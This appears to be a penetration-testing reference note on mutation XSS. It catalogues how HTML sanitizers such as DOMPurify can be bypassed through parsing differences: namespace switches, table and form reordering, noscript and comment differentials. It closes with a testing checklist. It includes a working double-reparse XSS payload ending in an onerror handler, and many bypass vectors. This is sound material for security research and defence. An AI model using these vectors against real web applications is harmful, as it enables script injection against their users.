# mXSS — Browser Mutation XSS Patterns

Source: https://sonarsource.github.io/mxss-cheatsheet/
Category: Web > XSS > Sanitizer Bypass

## Core Concept

Input passes sanitizer (looks safe) → browser re-parses/mutates the HTML DOM → sanitized content becomes executable JS. Exploits parsing differentials between sanitizer and browser engine.

## When to Test

- Target uses client-side HTML sanitizer (DOMPurify, sanitize-html, js-xss, Google Closure)
- Rich text editors, markdown renderers, WYSIWYG editors
- Any feature that accepts HTML and sanitizes before rendering
- innerHTML, insertAdjacentHTML, srcdoc usage

---

## HTML Namespace Mutations

### select — element deletion
Unwanted children get deleted. Abuse: break out via allowed intermediary.
```
<select><style><input><a> → <select></select><input><a></a>
```

### form — nesting bypass
Forms can't nest, but div wrapper preserves inner form temporarily.
```
<form id=outer><div></form><form id=inner><input>
→ parse 1: <form id=outer><div><form id=inner><input></form></div></form>
→ parse 2: <form id=outer><div><input></div></form>
```

Double-reparse payload (survives two sanitization rounds):
```
<form id=outer><math><mtext></form><form id=inner><mglyph><svg><mtext><form id=outer><mi></form><form id=inner><mglyph><desc><xmp><img src=x onerror=alert(1)>
```

### table — element reordering
Disallowed children get moved BEFORE the table.
```
<table><a> → <a></a><table></table>
<a><mglyph><table><a> → round1 nests → round2 splits anchors
```

### a — nesting prohibition
```
<a id=1><table><a id=2> → eventually splits into two separate <a> elements
```

### noscript — js-dependent parsing
DOMParser parses with scripting DISABLED. Browser renders with scripting ENABLED.
```
DOMParser: <noscript><a> → <noscript><a></a></noscript>
Browser:   <noscript><a> → <noscript><a></noscript>  (raw text)
```

### Active formatting element duplication
Elements: a, b, big, code, em, font, i, nobr, s, small, strike, strong, tt, u
These get duplicated across parsing roundtrips when DOM tree changes.
```
<li><a><table><li>t → round1 → round2: <a> gets duplicated
```

### plaintext
Can't be closed in HTML namespace, but table forces it:
```
<table><plaintext><a> → <plaintext><a></plaintext><table></table>
```

### textarea — content decoding
Content gets HTML-decoded. Comments not parsed inside textarea.

### comments — incorrectly opened
`<!`, `</`, `<?`, `<!-` → first `>` closes the comment (not `-->`).
```
<! comment > outside of comment
<!-- comment > still in comment -->
```

### is attribute persistence
`is` attribute survives serialization even after removeAttribute().

---

## SVG/MathML Namespace

### SVG HTML integration points
`foreignObject`, `desc`, `title` — content inside parsed as HTML.

### image → img mutation
`<svg><image>` allowed, but in HTML `image` becomes `img` (foreign content breaker).

### MathML integration points
`mi`, `mo`, `mn`, `ms`, `mtext` — children parsed as HTML.

### annotation-xml
Text integration point if `encoding="text/html"`.

### mglyph/malignmark
Direct descendant of MathML integration point → element stays in MathML namespace (not HTML).

---

## Foreign Content Breakers

These tags break out of SVG/MathML back to HTML namespace:
```
b, big, blockquote, body, br, center, code, dd, div, dl, dt, em, embed,
h1-h6, head, hr, i, img, li, listing, menu, meta, nobr, ol, p, pre,
ruby, s, small, span, strong, strike, sub, sup, table, tt, u, ul, var
```

`font` only breaks with `color`, `face`, or `size` attribute.

`head`/`body` break AND disappear: `<svg><body><a>` → `<svg></svg><a></a>`

---

## Browser-Specific: Fragment Parsing

Firefox: `<svg><div>` → `<svg><div></div></svg>` (keeps div inside SVG)
Chrome/Others: `<svg><div>` → `<svg></svg><div></div>` (breaks out)

---

## HTML5 vs HTML4/XML Differentials

### RCDATA/RAWTEXT bypass
If sanitizer uses XML parser:
```
<noframes><style></noframes><xss></style></noframes>
```

### Comment differential
```
Input: <!--><p>
HTML5: <!----><p></p>
HTML4: <!--><p>-->
```
Also works with `<!--->`.

### SVG/MathML (HTML5 only)
XML parsers don't handle foreign content. Bypass:
```
<svg><p><style><!--</style><xss>--></style>
```

### DOCTYPE abuse
HTML5 DOCTYPE ends at first `>`. XML allows nesting:
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTDHTML4.01//EN" "><xss>">
```

### Processing Instruction
XML has PI (`<?...?>`), HTML creates comment. Bypass:
```
<?x --><xss> ?>
```

---

## Testing Methodology

1. Identify sanitizer library + version (check JS bundles, package.json)
2. Check if DOMParser or innerHTML is used for sanitization
3. Test noscript differential (scripting enabled vs disabled)
4. Try namespace switches: HTML → SVG → MathML → HTML
5. Test double-parse stability (serialize → reparse → check mutation)
6. Check foreign content breaker behavior
7. Test table/form/select element reordering
8. Verify comment parsing mode (HTML5 vs XML)

## Key Insight

Most mXSS vectors exploit the gap between first parse (sanitizer) and second parse (browser render or innerHTML assignment). Any element that mutates between parse rounds is a potential vector.
